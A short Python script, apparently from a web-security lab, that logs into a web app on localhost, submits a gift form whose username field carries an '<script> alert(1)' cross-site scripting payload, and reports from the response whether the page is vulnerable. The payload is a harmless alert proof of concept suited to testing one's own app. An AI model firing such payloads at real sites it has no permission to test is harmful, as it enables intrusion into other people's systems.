import requests

indexUrl = 'http://127.0.0.1/index.html'
loginUrl = 'http://127.0.0.1/login.html'
gift0Url = 'http://127.0.0.1/gift.html'

userInfo = {'uname': 'gip200', 'pword': 'aaaaaa'}
payload = {'amount': '$0.00', 'username': '<script> alert(1) ; </script>'}

s = requests.Session()
cookies = s.cookies
cookies_dict = s.cookies.get_dict()
#print("no cookie yet", cookies)
#print

# try to log in, establish sessionid 
l = s.post(loginUrl, data=userInfo, cookies=cookies)
#print("just logged in, heres the cookie: " ,cookies)

for cookie in s.cookies:
    if cookie.name == 'sessionid':
        cookie.secure = 0
        break

#print("This is after adding secure flags:", cookies)
#print(cookies)

# Now we try the exploit with the sessionid
g = s.post(gift0Url, data=payload, cookies=cookies)

#check if the output string proves it is vulnerable
print(g.text)
if g.text.find("ERROR: <script> alert(1)") !=-1:
	print("Vulnerable to XSS!")
else:
	print("Not XSS Vulnerable.")

